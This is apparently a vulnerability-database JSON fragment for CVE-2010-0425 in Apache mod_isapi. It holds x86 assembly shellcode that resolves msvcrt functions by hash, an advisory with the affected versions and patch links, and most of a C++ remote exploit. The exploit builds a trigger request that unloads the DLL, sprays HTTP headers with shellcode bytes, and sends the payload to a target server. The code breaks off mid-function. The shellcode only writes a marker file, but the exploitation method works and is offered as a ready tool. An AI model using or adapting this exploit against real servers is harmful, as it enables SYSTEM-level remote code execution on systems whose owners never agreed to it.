PEB->Ldr.InInitOrder\r\nNextModule:\r\n\tmov edx, [esi+0x08]    ; EDX = InInitOrder[X].base_address\r\n    mov edi, [esi+0x20]    ; EDX = InInitOrder[X].module_name (unicode)\r\n    mov esi, [esi]         ; ESI = InInitOrder[X].flink (next module)\r\n    cmp [edi+10*2], cx     ; modulename[12] == 0 ?\r\n    jne NextModule         ; No: try next module.\r\n\t\r\n\t; extra check to find msvcrt.dll\r\n\tmov cx, 0x6d01         ; m = 0x6d\r\n\tsub cx, 0x6c94\r\n                           ; result is 0x6d (m)\r\n\tcmp [edi], cx          ; modulename[0] == m ?\r\n\tmov cx, ax\r\n\tjne NextModule\r\n\r\n\t; base address of msvcrt.dll is now in edx\r\n\t; update ebp\r\n\tmov ebp, esp\r\n\r\n\tjmp short GetHashesSpring ; using a spring to avoid null bytes\r\n\r\n; ======================= FUNCTIONS =======================\r\n; Export Directory Table method\r\nfind_function:\r\n    pushad\r\n    mov ebp, [esp + 0x24]\r\n    mov eax, [ebp + 0x3c]\r\n    mov edx, [ebp + eax + 0x78]\r\n    add edx, ebp\r\n    mov ecx, [edx + 0x18]\r\n    mov ebx, [edx + 0x20]\r\n    add ebx, ebp\r\nfind_function_loop:\r\n    jecxz find_function_finished\r\n    dec ecx\r\n    mov esi, [ebx + ecx * 4]\r\n    add esi, ebp\r\ncompute_hash:\r\n    xor edi, edi\r\n    xor eax, eax\r\n    cld\r\ncompute_hash_again:\r\n    lodsb\r\n    test al, al\r\n    jz compute_hash_finished\r\n    ror edi, 0xd\r\n    add edi, eax\r\n    jmp short compute_hash_again\r\ncompute_hash_finished:\r\nfind_function_compare:\r\n    cmp edi, [esp + 0x28]\r\n    jnz find_function_loop\r\n    mov ebx, [edx + 0x24]\r\n    add ebx, ebp\r\n    mov cx, [ebx + 2 * ecx]\r\n    mov ebx, [edx + 0x1c]\r\n    add ebx, ebp\r\n    mov eax, [ebx + 4 * ecx]\r\n    add eax, ebp\r\n    mov [esp + 0x1c], eax\r\nfind_function_finished:\r\n    popad\r\n    ret\r\n\r\nResolveSymbolsForDLL:\r\n    lodsd\r\n    push eax                    ; push hashes for find_function\r\n    push edx\r\n    call find_function\r\n    mov [edi], eax              ; save found function address\r\n    ;add sp, 0x08\r\n\tadd sp, 0x10c ; + 268\r\n\tsub sp, 0x104 ; - 260 = 8\r\n    ;add di, 0x04               ; increment edi by 4 (due to function address being saved)\r\n\tadd di, 0x108 ; + 264\r\n\tsub di, 0x104 ; - 260 = 4\r\n    cmp esi, ecx                ; check if esi meets length of hash list\r\n    jne ResolveSymbolsForDLL\r\nResolveSymbolsForDLLComplete:\r\n    ret\r\n\r\n; ====================== / FUNCTIONS ======================\r\n\r\nGetHashesSpring:\r\n\tjmp short GetHashes ; using a spring to avoid null bytes\r\n\r\nHashesReturn: \r\n    pop esi\r\n    lea edi, [ebp + 0x04]\r\n    mov ecx, esi\r\n    add cl, 0x0c              ; length of function hash list\r\n\r\n    call ResolveSymbolsForDLL\r\n\r\n\tjmp short GetFilename\r\n\t\r\nGetHashes:\r\n    call HashesReturn\r\n\t\r\n    ; msvcrt.dll hash list\r\n    ; fopen hash = 0x6E7C2EE1\r\n    db 0x6E\r\n    db 0x7C\r\n    db 0x2E\r\n    db 0xE1\r\n\r\n    ; fprintf hash = 0x1E3C3FD7\r\n    db 0x1E\r\n    db 0x3C\r\n    db 0x3F\r\n    db 0xD7\r\n\t; since the message is small, no need to worry about closing the file\r\n\t; keep the shellcode smaller that way.\r\n\t\r\n\t; exit hash = 0x741E48CD\r\n\tdb 0x74\r\n\tdb 0x1E\r\n\tdb 0x48\r\n\tdb 0xCD\r\n\r\nGetFilenameReturn: \r\n\txor edx, edx ; zero out a reg for nulls\r\n\r\n\tpop eax ; f.txt\r\n\tmov [eax+5], dl ; insert a null byte, 'f.txt'\r\n\t\r\n\tjmp short GetFileMode\r\n\r\nGetFileModeReturn:\r\n\txor edx, edx ; zero out a reg for nulls\r\n\r\n\tpop ecx ; w\r\n\tmov [ecx+1], dl ; insert a null byte, 'w'\r\n\r\n\tjmp short GetfopenCall ; Now jump to fopen call\r\n\t\r\nfopenCall:\t\r\n\tpush ecx ; 'w'\r\n\tpush eax ; push 'f.txt'\r\n\tcall [ebp+4]; call fopen\r\n\t\r\n\tjmp short GetfprintfData\r\n\r\nGetfprintfDataReturn:\r\n\txor edx, edx ; zero out a reg for a null\r\n\r\n\tpop ecx ; push data string\r\n\tmov [ecx+5], dl ; insert a null byte\r\n\t\r\n\tjmp short GetfprintfCall\r\n\r\nfprintfCall:\t\r\n\tpush ecx ; data\r\n\tpush eax ; handle\r\n\t\r\n\tmov esi, eax ; we want to keep the handle for close\r\n\t\r\n\tcall [ebp+8] ; call fprintf\r\n\r\n; It needs to either exit, or call fclose to write the buffer to file. \r\nExitProcessCall:\r\n\tpush ebx ; ebx has 00004000 in it - who cares what we give exit?\r\n\r\n\tcall [ebp+0x0c] ; exit\r\n\r\nGetFilename:\r\n\tcall GetFilenameReturn\r\n\tdb 'f.txtN' ; filename\r\n\r\nGetFileMode:\r\n\tcall GetFileModeReturn\r\n\tdb 'wN' ; file access mode\r\n\r\nGetfopenCall:\r\n\tcall fopenCall\r\n\r\nGetfprintfData:\r\n\tcall GetfprintfDataReturn\r\n\tdb 'pwnedN' ; data to be written to file\r\n\r\nGetfprintfCall:\r\n\tcall fprintfCall",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:14288"
        },
        {
            "bulletinFamily": "exploit",
            "description": "CVE:CVE-2010-0425\r\n\r\nApache is prone to a memory-corruption vulnerability.\r\n\r\nAttackers can leverage this vulnerability to execute arbitrary code with SYSTEM privileges; failed attacks may result in denial-of-service conditions.\r\n\r\nApache versions prior to 2.2.15 are affected. \n\nSlackware Linux x86_64 -current\r\nSlackware Linux 13.0 x86_64\r\nSlackware Linux 13.0\r\nSlackware Linux 12.2\r\nSlackware Linux 12.1\r\nSlackware Linux 12.0\r\nSlackware Linux -current\r\nIBM HTTP Server 6.1.0\r\nApache Software Foundation Apache 2.2.14\r\nApache Software Foundation Apache 2.2.13\r\nApache Software Foundation Apache 2.2.12\r\nApache Software Foundation Apache 2.2.11\r\nApache Software Foundation Apache 2.2.10\r\nApache Software Foundation Apache 2.2.9\r\n+ Adobe Flash Media Server 3.5.3\r\n+ Adobe Flash Media Server 3.5.2\r\n+ Adobe Flash Media Server 3.5.1\r\nApache Software Foundation Apache 2.2.8\r\nApache Software Foundation Apache 2.2.6\r\nApache Software Foundation Apache 2.2.5\r\nApache Software Foundation Apache 2.2.4\r\nApache Software Foundation Apache 2.2.3\r\nApache Software Foundation Apache 2.2.2\r\nApache Software Foundation Apache 2.2 .0\r\nApache Software Foundation Apache 2.0.63\r\nApache Software Foundation Apache 2.0.59\r\nApache Software Foundation Apache 2.0.58\r\n+ Debian Linux 3.1 sparc\r\n+ Debian Linux 3.1 s/390\r\n+ Debian Linux 3.1 ppc\r\n+ Debian Linux 3.1 mipsel\r\n+ Debian Linux 3.1 mips\r\n+ Debian Linux 3.1 m68k\r\n+ Debian Linux 3.1 ia-64\r\n+ Debian Linux 3.1 ia-32\r\n+ Debian Linux 3.1 hppa\r\n+ Debian Linux 3.1 arm\r\n+ Debian Linux 3.1 amd64\r\n+ Debian Linux 3.1 alpha\r\n+ Debian Linux 3.1\r\nApache Software Foundation Apache 2.0.56 -dev\r\nApache Software Foundation Apache 2.0.55\r\nApache Software Foundation Apache 2.0.54\r\n+ Debian Linux 3.1 sparc\r\n+ Debian Linux 3.1 s/390\r\n+ Debian Linux 3.1 ppc\r\n+ Debian Linux 3.1 mipsel\r\n+ Debian Linux 3.1 mips\r\n+ Debian Linux 3.1 m68k\r\n+ Debian Linux 3.1 ia-64\r\n+ Debian Linux 3.1 ia-32\r\n+ Debian Linux 3.1 hppa\r\n+ Debian Linux 3.1 arm\r\n+ Debian Linux 3.1 amd64\r\n+ Debian Linux 3.1 alpha\r\n+ Debian Linux 3.1\r\nApache Software Foundation Apache 2.0.53\r\nApache Software Foundation Apache 2.0.52\r\n+ Apple Mac OS X 10.3.6\r\n+ Apple Mac OS X 10.2.8\r\n+ Apple Mac OS X Server 10.3.6\r\n+ Apple Mac OS X Server 10.2.8\r\n+ RedHat Desktop 4.0\r\n+ RedHat Enterprise Linux AS 4\r\n+ RedHat Enterprise Linux ES 4\r\n+ RedHat Enterprise Linux WS 4\r\n+ Sun Solaris 10\r\nApache Software Foundation Apache 2.0.52\r\nApache Software Foundation Apache 2.0.51\r\n+ RedHat Fedora Core2\r\n+ RedHat Fedora Core1\r\nApache Software Foundation Apache 2.0.50\r\n+ MandrakeSoft Linux Mandrake 10.1 x86_64\r\n+ MandrakeSoft Linux Mandrake 10.1\r\nApache Software Foundation Apache 2.0.50\r\nApache Software Foundation Apache 2.0.49\r\n+ S.u.S.E. Linux Personal 9.1\r\n+ Trustix Secure Linux 2.1\r\n+ Trustix Secure Linux 2.0\r\nApache Software Foundation Apache 2.0.48\r\n+ MandrakeSoft Linux Mandrake 10.0 AMD64\r\n+ MandrakeSoft Linux Mandrake 10.0\r\n+ S.u.S.E. Linux 8.1\r\n+ S.u.S.E. Linux Personal 9.0 x86_64\r\n+ S.u.S.E. Linux Personal 9.0\r\n+ S.u.S.E. Linux Personal 8.2\r\n+ Trustix Secure Linux 2.1\r\n+ Trustix Secure Linux 2.0\r\nApache Software Foundation Apache 2.0.47\r\n+ Apple Mac OS X Server 10.3.5\r\n+ Apple Mac OS X Server 10.3.4\r\n+ Apple Mac OS X Server 10.3.3\r\n+ Apple Mac OS X Server 10.3.2\r\n+ Apple Mac OS X Server 10.3.1\r\n+ Apple Mac OS X Server 10.3\r\n+ Apple Mac OS X Server 10.2.8\r\n+ Apple Mac OS X Server 10.2.7\r\n+ Apple Mac OS X Server 10.2.6\r\n+ Apple Mac OS X Server 10.2.5\r\n+ Apple Mac OS X Server 10.2.4\r\n+ Apple Mac OS X Server 10.2.3\r\n+ Apple Mac OS X Server 10.2.2\r\n+ Apple Mac OS X Server 10.2.1\r\n+ Apple Mac OS X Server 10.2\r\n+ Apple Mac OS X Server 10.1.5\r\n+ Apple Mac OS X Server 10.1.4\r\n+ Apple Mac OS X Server 10.1.3\r\n+ Apple Mac OS X Server 10.1.2\r\n+ Apple Mac OS X Server 10.1.1\r\n+ Apple Mac OS X Server 10.1\r\n+ MandrakeSoft Linux Mandrake 9.2 amd64\r\n+ MandrakeSoft Linux Mandrake 9.2\r\n+ MandrakeSoft Linux Mandrake 9.1 ppc\r\n+ MandrakeSoft Linux Mandrake 9.1\r\nApache Software Foundation Apache 2.0.46\r\n+ RedHat Desktop 3.0\r\n+ RedHat Enterprise Linux AS 3\r\n+ RedHat Enterprise Linux ES 3\r\n+ RedHat Enterprise Linux WS 3\r\n+ Trustix Secure Linux 2.0\r\nApache Software Foundation Apache 2.0.46\r\nApache Software Foundation Apache 2.0.45\r\n- Apple Mac OS X 10.2.6\r\n- Apple Mac OS X 10.2.5\r\n- Apple Mac OS X 10.2.4\r\n- Apple Mac OS X 10.2.3\r\n- Apple Mac OS X 10.2.2\r\n- Apple Mac OS X 10.2.1\r\n- Apple Mac OS X 10.2\r\n- Apple Mac OS X 10.1.5\r\n- Apple Mac OS X 10.1.4\r\n- Apple Mac OS X 10.1.3\r\n- Apple Mac OS X 10.1.2\r\n- Apple Mac OS X 10.1.1\r\n- Apple Mac OS X 10.1\r\n- Apple Mac OS X 10.1\r\n- Apple Mac OS X 10.0.4\r\n- Apple Mac OS X 10.0.3\r\n- Apple Mac OS X 10.0.2\r\n- Apple Mac OS X 10.0.1\r\n- Apple Mac OS X 10.0\r\n+ Conectiva Linux 9.0\r\nApache Software Foundation Apache 2.0.44\r\nApache Software Foundation Apache 2.0.43\r\nApache Software Foundation Apache 2.0.42\r\n+ Gentoo Linux 1.4 _rc1\r\n+ Gentoo Linux 1.2\r\nApache Software Foundation Apache 2.0.41\r\nApache Software Foundation Apache 2.0.40\r\n+ RedHat Linux 9.0 i386\r\n+ RedHat Linux 8.0\r\n+ Terra Soft Solutions Yellow Dog Linux 3.0\r\nApache Software Foundation Apache 2.0.39\r\nApache Software Foundation Apache 2.0.38\r\nApache Software Foundation Apache 2.0.37\r\nApache Software Foundation Apache 2.2.7-dev\r\nApache Software Foundation Apache 2.2.6-dev\r\nApache Software Foundation Apache 2.2.5-dev\r\nApache Software Foundation Apache 2.2.1\r\nApache Software Foundation Apache 2.2\r\nApache Software Foundation Apache 2.0.62-dev\r\nApache Software Foundation Apache 2.0.61-dev\r\nApache Software Foundation Apache 2.0.60-dev\r\nApache Software Foundation Apache 2.0.58\r\nApache Software Foundation Apache 2.0.57\nSlackware Linux x86_64 -current\r\n\r\n    * Slackware httpd-2.2.15-x86_64-1.txz\r\n      ftp://ftp.slackware.com/pub/slackware/slackware64-current/slackware64/ n/httpd-2.2.15-x86_64-1.txz\r\n\r\n\r\nSlackware Linux 12.0\r\n\r\n    * Slackware httpd-2.2.15-i486-1_slack12.0.tgz\r\n      ftp://ftp.slackware.com/pub/slackware/slackware-12.0/patches/packages/ httpd-2.2.15-i486-1_slack12.0.tgz\r\n\r\n\r\nSlackware Linux -current\r\n\r\n    * Slackware httpd-2.2.15-i486-1.txz\r\n      ftp://ftp.slackware.com/pub/slackware/slackware-current/slackware/n/ht tpd-2.2.15-i486-1.txz\r\n\r\n\r\nSlackware Linux 12.2\r\n\r\n    * Slackware httpd-2.2.15-i486-1_slack12.2.tgz\r\n      ftp://ftp.slackware.com/pub/slackware/slackware-12.2/patches/packages/ httpd-2.2.15-i486-1_slack12.2.tgz\r\n\r\n\r\nSlackware Linux 13.0 x86_64\r\n\r\n    * Slackware httpd-2.2.15-x86_64-1_slack13.0.txz\r\n      ftp://ftp.slackware.com/pub/slackware/slackware64-13.0/patches/package s/httpd-2.2.15-x86_64-1_slack13.0.txz\r\n\r\n\r\nSlackware Linux 12.1\r\n\r\n    * Slackware httpd-2.2.15-i486-1_slack12.1.tgz\r\n      ftp://ftp.slackware.com/pub/slackware/slackware-12.1/patches/packages/ httpd-2.2.15-i486-1_slack12.1.tgz\r\n\r\n\r\nSlackware Linux 13.0\r\n\r\n    * Slackware httpd-2.2.15-i486-1_slack13.0.txz\r\n      ftp://ftp.slackware.com/pub/slackware/slackware-13.0/patches/packages/ httpd-2.2.15-i486-1_slack13.0.txz",
            "modified": "2010-03-17T00:00:00",
            "published": "2010-03-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-19282",
            "id": "SSV:19282",
            "title": "Apache 'mod_isapi' Memory Corruption Vulnerability",
            "type": "seebug",
            "sourceData": "\n                                                /*\r\n * Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit (CVE-2010-0425)\r\n * ------------------------------------------------------------------------------\r\n *\r\n * Advisory: http://www.senseofsecurity.com.au/advisories/SOS-10-002\r\n * \r\n * Description:\r\n * pwn-isapi.cpp exploits a dangling pointer vulnerabilty in Apache 2.2.14 mod_isapi.\r\n * Due to the nature of the vulnerability, and exploitation method, DEP should be limited to essential \r\n * Windows programs and services. At worst, if DEP is enabled for the Apache process, you could cause \r\n * a constant DoS by looping this (since apache will automatically restart) :)\r\n *\r\n * Note that the exploit code may need to be run multiple times before a shell is spawned (70%\r\n * success rate - tested on three different systems). Furthermore, the exploit code may require \r\n * modification to exploit this vulnerability on different platforms. This is due to loaded memory \r\n * references to the unloaded DLL (they will be different for each ISAPI module). Do not test\r\n * this code in a VM otherwise the code may fail to send the RESET packet (something to do with\r\n * VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want\r\n * to have to use raw packets on Windows. \r\n *\r\n * Shellcode Note: \r\n * The shellcode writes &quot;pwn-isapi&quot; to &quot;sos.txt&quot; which is created in the current working directory. \r\n * Most operating systems should be supported by this shellcode. I've used Skylined's method of finding\r\n * the base address of kernel32.dll for Windows 7 and modified it so that it will find the base \r\n * address of msvcrt.dll instead. I've also added another check so that it will be able to detect\r\n * &quot;msvcrt.dll&quot; on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this\r\n * DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of \r\n * msvcrt.dll. So the added check will verify the presents of &quot;m&quot; before proceeding. \r\n *\r\n * Author: \r\n * Brett Gervasoni (brettg [at] senseofsecurity.com.au)\r\n *\r\n * Copyright Sense of Security Pty Ltd 2010. \r\n * http://www.senseofsecurity.com.au\r\n */\r\n\r\n#include &lt;iostream&gt;\r\n#include &lt;windows.h&gt;\r\n#include &lt;winsock.h&gt;\r\n#include &lt;string&gt;\r\n#include &lt;direct.h&gt;\r\n\r\n#pragma comment(lib, &quot;wsock32.lib&quot;)\r\n\r\nusing namespace std;\r\n\r\n#define SERVER_PORT 80\r\n\r\nvoid header();\r\nint createConnection(string targetAddr, int targetPort);\r\nint sendTransmission(string message);\r\nstring recvTransmission();\r\nvoid cleanUp();\r\n\r\nWORD sockVersion;\r\nWSADATA wsaData;\r\n\r\nint sock;\r\nstruct sockaddr_in rserver;\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n\tstring serverIP, isapiDLL;\r\n\tstring triggerVuln, payload;\r\n\tchar accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];\r\n\r\n\t//custom shellcode that writes &quot;pwn-isapi&quot; to &quot;sos.txt&quot; in the current working directory\r\n\t//Note: There are four NOPs at the end for padding. Not really needed. \r\n\tchar shellcode[] = &quot;\\x31\\xc0\\x31\\xc9\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x56\\x08\\x8b&quot;\r\n\t\t\t\t\t   &quot;\\x7e\\x20\\x8b\\x36\\x66\\x39\\x4f\\x14\\x75\\xf2\\x66\\xb9\\x01\\x6d\\x66\\x81\\xe9\\x94&quot;\r\n\t\t\t\t\t   &quot;\\x6c\\x66\\x39\\x0f\\x66\\x89\\xc1\\x75\\xe1\\x89\\xe5\\xeb\\x71\\x60\\x8b\\x6c\\x24\\x24&quot;\r\n\t\t\t\t\t   &quot;\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3&quot;\r\n\t\t\t\t\t   &quot;\\x34\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1&quot;\r\n\t\t\t\t\t   &quot;\\xcf\\x0d\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01\\xeb\\x66&quot;\r\n\t\t\t\t\t   &quot;\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61&quot;\r\n\t\t\t\t\t   &quot;\\xc3\\xad\\x50\\x52\\xe8\\xaa\\xff\\xff\\xff\\x89\\x07\\x66\\x81\\xc4\\x0c\\x01\\x66\\x81&quot;\r\n\t\t\t\t\t   &quot;\\xec\\x04\\x01\\x66\\x81\\xc7\\x08\\x01\\x66\\x81\\xef\\x04\\x01\\x39\\xce\\x75\\xde\\xc3&quot;\r\n\t\t\t\t\t   &quot;\\xeb\\x10\\x5e\\x8d\\x7d\\x04\\x89\\xf1\\x80\\xc1\\x0c\\xe8\\xcd\\xff\\xff\\xff\\xeb\\x3b&quot;\r\n\t\t\t\t\t   &quot;\\xe8\\xeb\\xff\\xff\\xff\\x6e\\x7c\\x2e\\xe1\\x1e\\x3c\\x3f\\xd7\\x74\\x1e\\x48\\xcd\\x31&quot;\r\n\t\t\t\t\t   &quot;\\xd2\\x58\\x88\\x50\\x07\\xeb\\x2f\\x31\\xd2\\x59\\x88\\x51\\x01\\xeb\\x2e\\x51\\x50\\xff&quot;\r\n\t\t\t\t\t   &quot;\\x55\\x04\\xeb\\x2c\\x31\\xd2\\x59\\x88\\x51\\x09\\xeb\\x33\\x51\\x50\\x89\\xc6\\xff\\x55&quot;\r\n\t\t\t\t\t   &quot;\\x08\\x53\\xff\\x55\\x0c\\xe8\\xd1\\xff\\xff\\xff\\x73\\x6f\\x73\\x2e\\x74\\x78\\x74\\x4e&quot;\r\n\t\t\t\t\t   &quot;\\xe8\\xcc\\xff\\xff\\xff\\x77\\x4e\\xe8\\xcd\\xff\\xff\\xff\\xe8\\xcf\\xff\\xff\\xff\\x70&quot;\r\n\t\t\t\t\t   &quot;\\x77\\x6e\\x2d\\x69\\x73\\x61\\x70\\x69\\x4e\\xe8\\xc8\\xff\\xff\\xff\\x90\\x90\\x90\\x90&quot;;\r\n\r\n\theader();\r\n\r\n\tif (argc &lt; 3)\r\n\t{\r\n\t\tprintf(&quot;usage: %s &lt;ip&gt; &lt;DLL&gt;\\n&quot;, argv[0]);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tserverIP = string(argv[1]);\r\n\tisapiDLL = string(argv[2]);\r\n\r\n\t//all these values could be set to 7601 + sizeof(shellcode)\r\n\t//but mixing it up is good. \r\n\tmemset(accept, 'A', 170);\r\n\tmemset(referer, 'A', 732);\r\n\tmemset(cookie, 'A', 5375);\r\n\tmemset(random, 'A', 7603);\r\n\tmemset(postData, 'A', 23378);\r\n\tmemset(footer, 'A', 298);\r\n\r\n\ttriggerVuln = &quot;POST /cgi-bin/&quot; + isapiDLL + &quot; HTTP/1.0\\r\\n&quot;\r\n\t\t&quot;User-Agent: AAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Pragma: no-cache\\r\\n&quot;\r\n\t\t&quot;Proxy-Connection: Keep-Alive\\r\\n&quot;\r\n\t\t&quot;Host: &quot; + serverIP + &quot;\\r\\n&quot;\r\n\t\t&quot;Content-Length: 40334\\r\\n\\r\\n&quot; +\r\n\t\tstring(footer);\r\n\r\n\t//Modify the below request if needed (depending on where your function pointer is pointing)\r\n\t//Do so by adding or removing headers. So if you want to hit a higher function pointer, \r\n\t//keep adding headers :) \r\n\t//Note: If performing this blindly, try it a few times, change a bit, try again. \r\n\t//During testing i found that using a chunk of data the same size with the same header name\r\n\t//was more unreliable. In memory, large amounts of nulls are being placed either side of the \r\n\t//payload. Since the function pointer address was random, by slightly mixing up the size of \r\n\t//each header i would get better results.\r\n\tpayload = &quot;POST /cgi-bin/&quot; + isapiDLL + &quot; HTTP/1.0\\r\\n&quot;\r\n\t\t&quot;Accept: &quot; + string(accept) + &quot;\\r\\n&quot;\r\n\t\t&quot;Referer: &quot; + string(referer) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;From: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Utruvh-guiergher: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Accept-Language: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Content-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;UA-CPU: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Pragma: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\r\\n&quot;\r\n\t\t&quot;Cookie: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Host: &quot; + serverIP + &quot;\\r\\n&quot;\r\n\t\t&quot;Proxy-Connection: Keep-Alive\\r\\n&quot;\r\n\t\t&quot;Okytuasd: &quot; + string(cookie) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Asdasdasdasdasd: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Asdasda: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Sewrwefbui: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Qdfasdernu: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Cdffew-asdf: &quot; + string(random) + string(shellcode) + &quot;\\r\\n&quot;\r\n\t\t&quot;Kuiytnb-Ehrf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Lsfergjnuibubiu: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Baefrwerifnhu: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Zdsfno: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Psdfsafn: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Zefwefnuivre-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Ivre-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Yvasde-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Yuionbsdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Yasdasdasdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;asdasdde-sdf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Ertuioert-erf: &quot; + string(cookie) + string(shellcode) + &quot;BBBB&quot; + &quot;\\r\\n&quot;\r\n\t\t&quot;Content-Length: 25054\\r\\n\\r\\n&quot; + \r\n\t\tstring(postData) + &quot;CCCC&quot; + string(shellcode) + &quot;BBBB&quot; + string(footer);\r\n\r\n\t//Setup connection\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(&quot;- an error occurred connecting to the server\\n&quot;);\r\n\t\treturn 1;\r\n\t}\r\n\r\n\tprintf(&quot;[+] Connected to %s.\\n&quot;, serverIP.c_str());\r\n\r\n\tprintf(&quot;[+] Setting socket data structure values\\n&quot;);\r\n\tint iOptVal;\r\n\tint aiOptVal;\r\n\t\r\n\tstruct linger linger_data;\r\n\t\r\n\t//This is meant to set closesocket to do a &quot;graceful close&quot;,\r\n\t//however this is not the case when WSACancelBlockingCall() is called. A RESET packet is \r\n\t//sent as a result - Note that if in a vm, for some reason a RESET packet does not get sent. \r\n\tlinger_data.l_onoff = 0;\r\n\tlinger_data.l_linger = 0;\r\n\r\n\tsetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&amp;linger_data, sizeof(linger_data));\r\n\tsetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&amp;linger_data, sizeof(linger_data));\r\n\r\n\t//Set SO_LINGER to 0 so WSACancelBlockingCall() will cause a RESET packet to be sent\r\n\tgetsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&amp;linger_data, &amp;iOptVal);\r\n\tgetsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&amp;linger_data, &amp;aiOptVal);\r\n\tprintf(&quot;    - SO_LINGER value is set to %ld\\n&quot;, linger_data.l_onoff);\r\n\tprintf(&quot;    - SO_DONTLINGER value is set to %ld\\n&quot;, linger_data.l_linger);\r\n\t\r\n\tprintf(&quot;[*] Triggering DLL unload\\n&quot;);\r\n\tsendTransmission(triggerVuln);\r\n\r\n\tSleep(2000); //Sleep for a bit, otherwise on first run a RESET packet doesn't get sent. \r\n\tWSACancelBlockingCall(); //Cause reset packet response\r\n\r\n\tSleep(2000); //The multiple Sleeps seem to break up stuff a bit, making it more reliable...\r\n\tclosesocket(sock);\r\n\r\n\tSleep(2000);\r\n\tWSACleanup();\r\n\t\r\n\tSleep(2000);\r\n\tprintf(&quot;[+] The DLL should be unloaded by now\\n&quot;);\r\n\t\r\n\t//Reconnect to deliver payload\r\n\tif (createConnection(serverIP, SERVER_PORT) == 1)\r\n\t{\r\n\t\tprintf(&quot;- an error occurred connecting to the server\\n&quot;);\r\n\t\treturn 1;\r\n\t}\r\n\t\r\n\tprintf(&quot;[*] Sending payload\\n&quot;);\r\n\tsendTransmission(payload);\r\n\r\n\tcleanUp();\r\n\r\n\tprintf(&quot;[+] Check to see if sos.txt was created...\\n&quot;);\r\n\r\n\treturn 0;\r\n}\r\n\r\nvoid header()\r\n{\r\n\tprintf(&quot;Apache 2.2.14 mod_isapi Remote SYSTEM Exploit (CVE-2010-0425)\\n&quot;);\r\n\tprintf(&quot;-------------------------------------------------------------\\n&quot;);\r\n\tprintf(&quot;         Brett Gervasoni (brettg [at] senseofsecurity.com.au)\\n&quot;);\r\n\tprintf(&quot;                    Copyright Sense of Security Pty 